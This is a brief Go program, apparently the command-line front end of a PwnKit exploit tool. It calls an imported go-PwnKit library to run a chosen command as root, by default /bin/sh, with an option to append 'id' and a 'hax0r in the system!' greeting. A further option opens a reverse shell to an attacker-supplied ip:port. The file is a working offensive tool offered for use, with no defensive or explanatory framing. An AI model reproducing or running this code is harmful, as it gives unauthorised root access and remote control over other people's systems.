package main

import (
	"flag"
	"github.com/OXDBXKXO/go-PwnKit"
)

func main() {
	cmd := flag.String("c", "/bin/sh", "Command to execute as root")
	greetings := flag.Bool("g", false, "Append id and greetings to your command")
	reverseShell := flag.String("r", "", "Optionally open a reverse-shell instead. Format: ip:port")
	flag.Parse()

	if *reverseShell != "" {
		gopwnkit.RevShell(*reverseShell)
	} else if *greetings {
		gopwnkit.Command("id; echo \"hax0r in the system!\";" + *cmd)
	} else {
		gopwnkit.Command(*cmd)
	}
}
